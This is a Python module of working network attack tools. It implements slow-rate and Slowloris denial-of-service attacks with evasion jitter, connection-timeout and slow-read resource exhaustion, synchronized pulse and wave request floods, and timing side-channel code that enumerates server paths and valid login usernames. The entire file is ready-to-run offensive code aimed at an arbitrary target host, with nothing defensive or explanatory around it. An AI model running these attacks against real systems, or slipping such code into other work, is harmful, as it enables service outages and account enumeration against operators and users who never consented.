"""
Advanced Timing Attacks Module

Sophisticated timing-based attack techniques:
- Slow-rate attacks
- Time-based resource exhaustion
- Timing side-channel attacks
- Synchronized timing attacks
"""

import asyncio
import time
import random
import math
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Callable, Tuple
from enum import Enum
import logging

logger = logging.getLogger(__name__)


class TimingPattern(Enum):
    """Timing attack patterns"""
    CONSTANT = "constant"
    LINEAR_RAMP = "linear_ramp"
    EXPONENTIAL = "exponential"
    SINUSOIDAL = "sinusoidal"
    FIBONACCI = "fibonacci"
    RANDOM_WALK = "random_walk"
    HEARTBEAT = "heartbeat"
    BURST = "burst"


@dataclass
class TimingConfig:
    """Timing attack configuration"""
    pattern: TimingPattern = TimingPattern.CONSTANT
    base_interval: float = 1.0
    min_interval: float = 0.01
    max_interval: float = 10.0
    jitter: float = 0.1
    duration: int = 60


class TimingGenerator:
    """
    Generates timing patterns for attacks
    """
    
    def __init__(self, config: TimingConfig):
        self.config = config
        self._step = 0
        self._fib_cache = [1, 1]
        self._random_walk_value = config.base_interval
        
    def next_interval(self) -> float:
        """Get next timing interval"""
        self._step += 1
        
        if self.config.pattern == TimingPattern.CONSTANT:
            interval = self.config.base_interval
            
        elif self.config.pattern == TimingPattern.LINEAR_RAMP:
            # Gradually decrease interval
            progress = min(self._step / 100, 1.0)
            interval = self.config.max_interval - (self.config.max_interval - self.config.min_interval) * progress
            
        elif self.config.pattern == TimingPattern.EXPONENTIAL:
            # Exponential decrease
            interval = self.config.max_interval * math.exp(-self._step / 50)
            interval = max(interval, self.config.min_interval)
            
        elif self.config.pattern == TimingPattern.SINUSOIDAL:
            # Oscillating interval
            phase = self._step * 0.1
            interval = self.config.base_interval + (self.config.max_interval - self.config.min_interval) / 2 * math.sin(phase)
            
        elif self.config.pattern == TimingPattern.FIBONACCI:
            # Fibonacci-based timing
            while len(self._fib_cache) <= self._step:
                self._fib_cache.append(self._fib_cache[-1] + self._fib_cache[-2])
            fib = self._fib_cache[min(self._step, len(self._fib_cache) - 1)]
            interval = self.config.base_interval / (1 + math.log(fib + 1))
            
        elif self.config.pattern == TimingPattern.RANDOM_WALK:
            # Random walk
            change = random.uniform(-0.1, 0.1) * self.config.base_interval
            self._random_walk_value += change
            self._random_walk_value = max(self.config.min_interval, 
                                         min(self.config.max_interval, self._random_walk_value))
            interval = self._random_walk_value
            
        elif self.config.pattern == TimingPattern.HEARTBEAT:
            # Heartbeat pattern (quick-quick-pause)
            cycle = self._step % 4
            if cycle < 2:
                interval = self.config.min_interval
            else:
                interval = self.config.max_interval
                
        elif self.config.pattern == TimingPattern.BURST:
            # Burst pattern
            cycle = self._step % 20
            if cycle < 5:
                interval = self.config.min_interval
            else:
                interval = self.config.max_interval
                
        else:
            interval = self.config.base_interval
            
        # Apply jitter
        jitter = random.uniform(-self.config.jitter, self.config.jitter) * interval
        interval += jitter
        
        return max(self.config.min_interval, min(self.config.max_interval, interval))
        
    def reset(self):
        """Reset generator state"""
        self._step = 0
        self._random_walk_value = self.config.base_interval


class SlowRateAttack:
    """
    Slow-Rate Attack
    
    Sends requests at a rate just below detection thresholds.
    """
    
    def __init__(self, target: str, port: int = 80, requests_per_minute: float = 10):
        self.target = target
        self.port = port
        self.requests_per_minute = requests_per_minute
        self._running = False
        self._stats = {'requests': 0, 'errors': 0, 'bytes_sent': 0}
        
    async def start(self, duration: int = 300):
        """Start slow-rate attack"""
        self._running = True
        self._stats = {'requests': 0, 'errors': 0, 'bytes_sent': 0}
        
        interval = 60.0 / self.requests_per_minute
        start_time = time.time()
        
        logger.info(f"Starting slow-rate attack: {self.requests_per_minute} req/min")
        
        while self._running and (time.time() - start_time) < duration:
            try:
                await self._send_request()
                self._stats['requests'] += 1
            except Exception as e:
                self._stats['errors'] += 1
                logger.debug(f"Request error: {e}")
                
            # Add randomization to avoid detection
            jitter = random.uniform(0.8, 1.2)
            await asyncio.sleep(interval * jitter)
            
        self._running = False
        return self._stats
        
    async def _send_request(self):
        """Send single slow request"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=30
            )
            
            # Send partial request slowly
            request = f"GET /?t={time.time()} HTTP/1.1\r\nHost: {self.target}\r\n"
            
            for char in request:
                writer.write(char.encode())
                await writer.drain()
                await asyncio.sleep(0.1)  # Slow send
                
            # Complete request
            writer.write(b"\r\n")
            await writer.drain()
            
            # Read response
            try:
                await asyncio.wait_for(reader.read(1024), timeout=5)
            except asyncio.TimeoutError:
                pass
                
            writer.close()
            self._stats['bytes_sent'] += len(request) + 2
            
        except Exception:
            raise
            
    def stop(self):
        """Stop attack"""
        self._running = False


class SlowlorisAdvanced:
    """
    Advanced Slowloris Attack
    
    Enhanced slowloris with multiple evasion techniques.
    """
    
    def __init__(self, target: str, port: int = 80, connections: int = 100):
        self.target = target
        self.port = port
        self.max_connections = connections
        self._connections: List[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = []
        self._running = False
        self._stats = {'active_connections': 0, 'total_connections': 0, 'keepalives_sent': 0}
        
    async def start(self, duration: int = 300):
        """Start advanced slowloris attack"""
        self._running = True
        start_time = time.time()
        
        logger.info(f"Starting advanced slowloris: {self.max_connections} connections")
        
        # Initial connection burst
        await self._establish_connections()
        
        # Maintain connections
        while self._running and (time.time() - start_time) < duration:
            # Send keepalives
            await self._send_keepalives()
            
            # Replace dead connections
            await self._replace_dead_connections()
            
            # Random delay
            await asyncio.sleep(random.uniform(5, 15))
            
        # Cleanup
        await self._close_all()
        
        self._running = False
        return self._stats
        
    async def _establish_connections(self):
        """Establish initial connections"""
        tasks = []
        for _ in range(self.max_connections):
            tasks.append(self._create_connection())
            
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _create_connection(self):
        """Create single slowloris connection"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10
            )
            
            # Send partial HTTP request
            headers = [
                f"GET /?{random.randint(1, 99999)} HTTP/1.1",
                f"Host: {self.target}",
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                f"Accept: text/html,application/xhtml+xml",
                f"Accept-Language: en-US,en;q=0.{random.randint(5, 9)}",
                f"Connection: keep-alive",
            ]
            
            for header in headers:
                writer.write(f"{header}\r\n".encode())
                await writer.drain()
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
            # Don't send final \r\n to keep connection open
            
            self._connections.append((reader, writer))
            self._stats['active_connections'] = len(self._connections)
            self._stats['total_connections'] += 1
            
        except Exception as e:
            logger.debug(f"Connection failed: {e}")
            
    async def _send_keepalives(self):
        """Send keepalive headers to all connections"""
        dead_connections = []
        
        for i, (reader, writer) in enumerate(self._connections):
            try:
                # Send random header to keep connection alive
                headers = [
                    f"X-a: {random.randint(1, 9999)}",
                    f"X-b: {random.randint(1, 9999)}",
                    f"X-c: {random.randint(1, 9999)}",
                ]
                header = random.choice(headers)
                
                writer.write(f"{header}\r\n".encode())
                await writer.drain()
                
                self._stats['keepalives_sent'] += 1
                
            except Exception:
                dead_connections.append(i)
                
        # Remove dead connections
        for i in reversed(dead_connections):
            try:
                self._connections[i][1].close()
            except Exception:
                pass
            self._connections.pop(i)
            
        self._stats['active_connections'] = len(self._connections)
        
    async def _replace_dead_connections(self):
        """Replace dead connections"""
        needed = self.max_connections - len(self._connections)
        
        if needed > 0:
            tasks = [self._create_connection() for _ in range(min(needed, 10))]
            await asyncio.gather(*tasks, return_exceptions=True)
            
    async def _close_all(self):
        """Close all connections"""
        for reader, writer in self._connections:
            try:
                writer.close()
            except Exception:
                pass
        self._connections.clear()
        
    def stop(self):
        """Stop attack"""
        self._running = False


class ResourceExhaustionTiming:
    """
    Time-Based Resource Exhaustion
    
    Exploits time-based resource allocation.
    """
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self._running = False
        
    async def connection_timeout_attack(self, connections: int = 1000, 
                                        timeout_seconds: int = 30):
        """
        Exhaust connection timeout resources.
        
        Opens connections and holds them until timeout.
        """
        self._running = True
        active = []
        stats = {'connections_opened': 0, 'connections_held': 0}
        
        logger.info(f"Starting connection timeout attack: {connections} connections")
        
        # Open connections
        for _ in range(connections):
            if not self._running:
                break
                
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, self.port),
                    timeout=5
                )
                active.append((reader, writer, time.time()))
                stats['connections_opened'] += 1
                
            except Exception:
                pass
                
            await asyncio.sleep(0.01)
            
        # Hold connections
        while self._running and active:
            current_time = time.time()
            
            # Remove timed-out connections
            active = [(r, w, t) for r, w, t in active 
                     if (current_time - t) < timeout_seconds]
            
            stats['connections_held'] = len(active)
            await asyncio.sleep(1)
            
        # Cleanup
        for reader, writer, _ in active:
            try:
                writer.close()
            except Exception:
                pass
                
        self._running = False
        return stats
        
    async def slow_read_attack(self, duration: int = 60):
        """
        Slow read attack.
        
        Reads response data very slowly to hold server resources.
        """
        self._running = True
        stats = {'bytes_read': 0, 'connections': 0}
        
        async def slow_reader():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, self.port),
                    timeout=10
                )
                
                # Request large resource
                request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                stats['connections'] += 1
                
                # Read very slowly
                start = time.time()
                while self._running and (time.time() - start) < duration:
                    try:
                        data = await asyncio.wait_for(reader.read(1), timeout=30)
                        if not data:
                            break
                        stats['bytes_read'] += 1
                        await asyncio.sleep(1)  # 1 byte per second
                    except asyncio.TimeoutError:
                        break
                        
                writer.close()
                
            except Exception as e:
                logger.debug(f"Slow read error: {e}")
                
        # Start multiple slow readers
        tasks = [slow_reader() for _ in range(10)]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self._running = False
        return stats
        
    def stop(self):
        """Stop attack"""
        self._running = False


class SynchronizedTimingAttack:
    """
    Synchronized Timing Attack
    
    Coordinates multiple sources to attack at precise times.
    """
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self._running = False
        
    async def pulse_sync_attack(self, workers: int = 10, pulses: int = 10,
                                pulse_duration: float = 0.5, 
                                pulse_interval: float = 2.0):
        """
        Synchronized pulse attack.
        
        All workers send requests simultaneously in pulses.
        """
        self._running = True
        stats = {'pulses': 0, 'requests': 0, 'errors': 0}
        
        async def worker(worker_id: int, sync_event: asyncio.Event):
            nonlocal stats
            
            while self._running:
                # Wait for sync signal
                await sync_event.wait()
                
                # Send burst
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target, self.port),
                        timeout=5
                    )
                    
                    request = f"GET /?w={worker_id}&t={time.time()} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                    writer.write(request.encode())
                    await writer.drain()
                    
                    writer.close()
                    stats['requests'] += 1
                    
                except Exception:
                    stats['errors'] += 1
                    
        # Create sync event
        sync_event = asyncio.Event()
        
        # Start workers
        worker_tasks = [
            asyncio.create_task(worker(i, sync_event))
            for i in range(workers)
        ]
        
        # Coordinate pulses
        for pulse in range(pulses):
            if not self._running:
                break
                
            logger.info(f"Pulse {pulse + 1}/{pulses}")
            
            # Signal all workers
            sync_event.set()
            await asyncio.sleep(pulse_duration)
            sync_event.clear()
            
            stats['pulses'] += 1
            
            # Wait between pulses
            await asyncio.sleep(pulse_interval)
            
        # Cleanup
        self._running = False
        for task in worker_tasks:
            task.cancel()
            
        return stats
        
    async def wave_attack(self, waves: int = 5, workers_per_wave: int = 20,
                         wave_delay: float = 0.1):
        """
        Wave attack.
        
        Sends requests in waves with slight delays.
        """
        self._running = True
        stats = {'waves': 0, 'requests': 0}
        
        async def send_request():
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, self.port),
                    timeout=5
                )
                
                request = f"GET /?t={time.time()} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                writer.close()
                
                return True
            except Exception:
                return False
                
        for wave in range(waves):
            if not self._running:
                break
                
            logger.info(f"Wave {wave + 1}/{waves}")
            
            # Send wave
            tasks = [send_request() for _ in range(workers_per_wave)]
            results = await asyncio.gather(*tasks)
            
            stats['waves'] += 1
            stats['requests'] += sum(1 for r in results if r)
            
            # Delay between waves
            await asyncio.sleep(wave_delay)
            
        self._running = False
        return stats
        
    def stop(self):
        """Stop attack"""
        self._running = False


class TimingSideChannel:
    """
    Timing Side-Channel Analysis
    
    Analyzes timing variations to extract information.
    """
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self._measurements: List[Tuple[str, float]] = []
        
    async def measure_response_time(self, path: str) -> float:
        """Measure response time for a request"""
        start = time.perf_counter()
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10
            )
            
            request = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()
            
            # Read first byte
            await asyncio.wait_for(reader.read(1), timeout=10)
            
            elapsed = time.perf_counter() - start
            
            writer.close()
            
            return elapsed
            
        except Exception:
            return -1
            
    async def enumerate_paths(self, paths: List[str], samples: int = 5) -> Dict[str, float]:
        """
        Enumerate paths using timing analysis.
        
        Existing paths typically have different response times than 404s.
        """
        results = {}
        
        for path in paths:
            times = []
            for _ in range(samples):
                t = await self.measure_response_time(path)
                if t > 0:
                    times.append(t)
                await asyncio.sleep(0.1)
                
            if times:
                avg_time = sum(times) / len(times)
                results[path] = avg_time
                self._measurements.append((path, avg_time))
                
        return results
        
    async def detect_valid_usernames(self, usernames: List[str], 
                                     login_path: str = "/login",
                                     samples: int = 3) -> List[str]:
        """
        Detect valid usernames via timing analysis.
        
        Valid usernames often have different processing times.
        """
        baseline_times = []
        username_times = {}
        
        # Get baseline with random usernames
        for _ in range(5):
            random_user = f"nonexistent_{random.randint(10000, 99999)}"
            t = await self._measure_login_time(login_path, random_user)
            if t > 0:
                baseline_times.append(t)
                
        if not baseline_times:
            return []
            
        baseline_avg = sum(baseline_times) / len(baseline_times)
        baseline_std = (sum((t - baseline_avg) ** 2 for t in baseline_times) / len(baseline_times)) ** 0.5
        
        # Test usernames
        potential_valid = []
        
        for username in usernames:
            times = []
            for _ in range(samples):
                t = await self._measure_login_time(login_path, username)
                if t > 0:
                    times.append(t)
                await asyncio.sleep(0.1)
                
            if times:
                avg_time = sum(times) / len(times)
                username_times[username] = avg_time
                
                # Check if significantly different from baseline
                if abs(avg_time - baseline_avg) > 2 * baseline_std:
                    potential_valid.append(username)
                    
        return potential_valid
        
    async def _measure_login_time(self, path: str, username: str) -> float:
        """Measure login attempt time"""
        start = time.perf_counter()
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10
            )
            
            body = f"username={username}&password=test"
            request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"\r\n{body}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            await asyncio.wait_for(reader.read(1), timeout=10)
            
            elapsed = time.perf_counter() - start
            writer.close()
            
            return elapsed
            
        except Exception:
            return -1
            
    def get_measurements(self) -> List[Tuple[str, float]]:
        """Get all timing measurements"""
        return self._measurements.copy()
